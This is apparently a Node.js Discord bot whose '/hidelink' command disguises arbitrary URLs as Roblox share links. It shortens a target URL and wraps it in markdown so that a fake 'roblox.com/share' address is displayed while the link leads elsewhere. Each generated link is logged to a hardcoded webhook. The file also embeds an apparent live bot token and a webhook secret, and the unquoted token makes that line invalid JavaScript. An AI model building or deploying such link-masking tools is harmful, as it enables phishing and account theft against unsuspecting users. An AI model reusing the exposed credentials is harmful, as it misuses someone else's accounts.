require('dotenv').config();
const http = require('http');
const {
  Client, GatewayIntentBits, EmbedBuilder, ActionRowBuilder, 
  ButtonBuilder, ButtonStyle, REST, Routes, SlashCommandBuilder
} = require('discord.js');

const fetch = require('node-fetch');

// Keep-Alive Server for Render
http.createServer((req, res) => {
  res.write("Bot is Online!");
  res.end();
}).listen(8080);

const TOKEN = MTQ3NzYxNjQ4NjY1ODA4NTAwNQ.GkGRDW.gZDG7si1HUVCqNcczJjG5merGd1cAwgpQr3BHo;
const CLIENT_ID = '1477616486658085005';
const WEBHOOK_URL = 'https://discord.com/api/webhooks/1472822287278412000/9KAR1_rdsPqOoRF_zkuqNZ1yRKloh33LFlXjn_NWZ_nIG_pM2FIZwhE6HCXbUE5rTe1l';

const client = new Client({ intents: [GatewayIntentBits.Guilds] });

const commands = [
  new SlashCommandBuilder()
    .setName('hidelink')
    .setDescription('Create a hidden redirect link')
    .addStringOption(opt => opt.setName('url').setDescription('Target URL').setRequired(true))
    .addStringOption(opt =>
      opt.setName('type').setDescription('Link type').setRequired(true)
        .addChoices(
          { name: '🕹️ Private Server', value: 'private_server' },
          { name: '👤 Profile', value: 'profile' },
          { name: '👥 Group', value: 'group' }
        )
    ),
].map(cmd => cmd.toJSON());

const rest = new REST({ version: '10' }).setToken(TOKEN);

(async () => {
  try {
    await rest.put(Routes.applicationCommands(CLIENT_ID), { body: commands });
    console.log('✅ Commands Registered');
  } catch (err) { console.error(err); }
})();

async function shortenURL(targetUrl) {
    try {
        const res = await fetch(`https://is.gd/create.php?format=simple&url=${encodeURIComponent(targetUrl)}`);
        const text = await res.text();
        if (res.ok && !text.toLowerCase().includes("error")) return text.trim();
    } catch (e) {}
    throw new Error("error 303");
}

client.on('interactionCreate', async interaction => {
  if (interaction.isChatInputCommand() && interaction.commandName === 'hidelink') {
    await interaction.deferReply({ ephemeral: true });
    let url = interaction.options.getString('url').trim();
    if (!url.startsWith('http')) url = 'https://' + url;

    try {
      const shortUrl = await shortenURL(url);
      const displayUrl = `https_ . : //www.roblox.com/share?code=${Math.random().toString().slice(2, 12)}&type=Server`;
      const rawCopy = `[${displayUrl}](${shortUrl})`;

      const embed = new EmbedBuilder()
        .setTitle('HIDELINK SUCCESSFUL').setColor('#00A8FC')
        .addFields(
          { name: 'SHORT LINK', value: shortUrl, inline: true },
          { name: 'RAW (COPY)', value: `\`\`\`${rawCopy}\`\`\`` }
        );

      await interaction.editReply({ embeds: [embed] });

      // Webhook Log
      await fetch(WEBHOOK_URL, {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({ content: `✅ **${interaction.user.tag}** generated: \`${rawCopy}\`` })
      });

    } catch (err) {
      await interaction.editReply({ content: `❌ **Error:** error 303 | dm @evilkalu for help` });
    }
  }
});

client.login(TOKEN);
